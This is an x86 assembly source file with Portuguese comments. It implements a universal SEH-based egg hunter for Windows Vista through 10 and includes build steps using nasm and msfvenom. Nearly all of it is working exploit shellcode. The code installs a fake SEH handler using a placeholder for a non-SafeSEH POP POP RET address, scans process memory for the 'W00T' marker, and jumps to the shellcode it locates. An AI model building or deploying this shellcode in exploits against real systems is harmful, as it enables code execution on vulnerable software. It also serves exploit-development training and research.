; Universal SEH based egg hunter (x86 and wow64)
; Testado nas seguintes versões:
;  - Windows Vista
;  - Windows 7
;  - Windows 10
;
; Autor: Peter Van Eeckhoutte (corelanc0d3r)
; Ajustes por: Helvio Junior (M4v3r1cK)
;
; Atencao: Este codigo danificara a pilha em volta do ESP
;
; Utilizacao: localizar um endereco de POP; POP; RET sem protecao SafeSEH e substituir no PLACEHOLDER abaixo.
;
;
; Procedimento de compilação do EggHunter
; nasm egghunter_w10.asm -o egghunter_w10
; cat egghunter_w10 | msfvenom -p - -a x86 --platform win -e generic/none -f python
;
; 75 bytes egghunter

[BITS 32]

_start:
    jmp start                   ; Salta para a chamada da função que inicia nosso codigo

setup:
    POP ECX                     ; Salva o endereco do handle no registrador ECX
                                ; Quando dentro da função o valor salvo no topo da pilha o endereco
                                ; da proxima instrucao (EIP) logo apos a chamada da funcao
                                ; no nosso caso o endereco do handle


stack_align:
                                ; Realinha a pilha de forma que o SEH que serta criado
                                ; esteja junto com a cadeia SEH atual
    XOR EBX,EBX
    MOV ESP, DWORD [FS:EBX]

    ;cria nosso registro SEH
    PUSH ECX                    ; salva na pilha o local onde nosso 'custom' SE Handler estara
    PUSH ECX                    ; p/p/r vai passar por estes dados (sera ignorado)
    PUSH 0x90c3585c             ; chama o p/p/r novamente :)
                                ; Corresponde as instrucoes abaixo:
                                ; 5C       POP ESP
                                ; 58       POP EAX
                                ; C3       RET
                                ; 90       NOP
    PUSH 0x41414141             ; Substituir por um endereço de P/P/R sem SafeSEH  ** PLACEHOLDER **
    PUSH 0x04EB5858             ; SHORT JUMP
                                ; Corresponde as instrucoes abaixo:
                                ; 58       POP EAX
                                ; 58       POP EAX
                                ; EB 04    JMP SHORT 0x06
    MOV DWORD [FS:EBX],ESP      ; Coloca nosso SEH no topo da cadeia SEH

    JMP loop_inc_page           ; Salta para o ponto de inclusao de pagina

start:
    xor edx,edx                 ; Define endereço inicial como sendo 0x00000000
    call setup                  ; Faz um call para a função de setup
                                ; isso faz que o aplicativo monte a pilha para a função, fazendo com que o 
                                ; endereço do ESP (na pilha do da funcao setup) seja o endereço de retorno, ou seja,
                                ; o endereço do EIP do fluxo normal de execução, quem em nosso caso sera o endereco
                                ; do handler (abaixo)

handle:                         ; our custom handle
    SUB ESP,0x14                ; undo changes to ESP
    XOR EBX,EBX                 ; Zera EBX para ser usado como [FS:0]
    MOV DWORD [FS:EBX],ESP      ; make our SEH record topmost again
    MOV EDX, [ESP+24]           ; resgata o ultimo endereco de edx para continuar a checagem da onde paramos
    INC EDX                     ; se ocorreu uma execao quer dizer que nao podemos leo o endereco atual de edx
                                ; sendo assim adiciona 1 ao valor atual para dar continuidade a busca

loop_inc_page:
    OR DX, 0x0FFF               ; adiciona 4KB ao endereço do EDX

loop_inc_one:
    inc edx                     ; atua como um contador
                                ; incrementa 1 ao valor de EDX

loop_check:                     ; checa o endereço atual
    MOV [ESP+24], EDX           ; salva o endereco de EDX (ponto em que vamos verificar)
                                ; pois apos o retorno da excecao podemos resgatar este valor e continuar da onde paramos
    MOV EAX, 0x57303054         ; este é o EGG, ou seja o texto que estamos procurando (W00T)
    MOV EDI, EDX                ; define EDI para nosso endereço de memória
    SCASD                       ; compara EAX com o conteúdo de EDI (que é o conteúdo do EDX)
    JNZ loop_inc_one            ; checa se são iguais, caso não, salta para loop_inc_one
                                ; caso sejam simplesmente continua a execução indo para o próximo passo
    SCASD                       ; realiza a checagem do proximo endereçamento de memória EDX + 4, para checar o segundo EGG
    JNZ loop_inc_one            ; checa se são iguais, caso não, salta para loop_inc_one
                                ; caso sejam simplesmente continua a execução indo para o próximo passo

matched:                        ; Se chegamos ate aqui quer dizer que o egg foi encontrado
    jmp edi                     ; EDI aponta para o início do shellcode
                                ; realiza um JMP para o shellcode
